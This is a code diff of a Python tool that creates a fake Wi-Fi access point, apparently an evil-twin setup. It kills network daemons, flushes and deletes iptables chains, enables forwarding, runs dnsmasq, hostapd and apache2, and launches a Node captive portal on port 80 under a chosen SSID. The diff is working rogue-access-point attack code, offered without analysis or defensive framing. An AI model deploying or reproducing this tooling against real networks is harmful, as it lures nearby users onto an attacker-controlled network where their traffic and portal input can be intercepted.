@@ -1,4 +1,5 @@
 import os
+import signal
 from threading import Thread
 
 import tools
@@ -36,26 +37,33 @@ def setup_fake_access_point(interface):
     os.system("airmon-ng check kill " + DEV_NULL)
     os.system("killall dnsmasq " + DEV_NULL)
     os.system("killall hostapd " + DEV_NULL)
-    set_ap_ip = "ifconfig " + interface + " 10.0.0.1 netmask 255.255.255.0"
-    os.system(set_ap_ip)
+    os.system(f'ifconfig {interface} 10.0.0.1 netmask 255.255.255.0')  # netmask 255.255.255.0
+
+    # set_ap_ip =
+    # os.system(set_ap_ip)
     # Define the default gateway.
     os.system('route add default gw 10.0.0.1')
     # Enable IP Forwarding (DISABLE=0, ENABLE=1)
+    # os.system('sysctl -w net.ipv4.ip_forward=1')
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
     # Flush all chains of `filter` and `NAT` iptables (Linux FireWall utilities).
     os.system('iptables --flush')
+    os.system('iptables --table nat --flush')
+    os.system('iptables --delete-chain')
+    os.system('iptables --table nat --delete-chain')
     # Allowing packets that routed through the system (=FORWARD) to pass through.
     os.system('iptables -P FORWARD ACCEPT')
 
 
-def run_fake_ap():
+def run_fake_ap(interface):
     # Use dnsmasq as a DHCP server.
     os.system('dnsmasq -C dnsmasq.conf')
-    # Start a web server using a separate process (Shell).
-    os.system('gnome-terminal -- sh -c "node html/index.js"')
     # Link hostapd to the configuration file.
     os.system('hostapd hostapd.conf -B')
     os.system('route add default gw 10.0.0.1')
+    os.system('service apache2 start')
+    # Start a web server using a separate process (Shell).
+    os.system('gnome-terminal -- sh -c "node CaptivePortal/script2.js"')
 
 
 # Create the hostapd and dnsmasq configuration files.
@@ -82,7 +90,6 @@ def start(iface, ssid):
     title = "===============================================================\n" \
             "====================== FAKE ACCESS POINT ======================\n" \
             "===============================================================\n"
-
     pretty(title)
     print(f"\n\t\tCreating Fake Hotspot: \"{ssid}\"...")
     pretty("\n\t\t\tPlease wait...\n")
@@ -93,9 +100,10 @@ def start(iface, ssid):
     create_conf_files(iface, ssid)
     print('Starting a captive portal on port 80')
     try:
-        run_fake_ap()
+        run_fake_ap(interface=iface)
     except Exception as e:
         pretty(f'Unfortunately something went wrong...')
+        os.system(f'python3 reset_network_settings.py')
         print(e)
     print(f'\n\t\"{ssid}\" is now a visible (Fake) Access Point!')
     input("\n\tPress enter to stop the fake AP and reset network settings\n")
@@ -104,7 +112,6 @@ def start(iface, ssid):
     reset_network_settings()
     print("Network settings were successfully restored!\nDone!\n")
     pretty("\nFake AP was shut down successfully!\n")
-    # exit(0)
 
 
 class FakeAP:
@@ -116,6 +123,9 @@ class FakeAP:
 
     def start(self):
         self.ap.start()
+
+    def wait_to_finish(self):
+        return self.ap.join()
 
 
 if __name__ == '__main__':
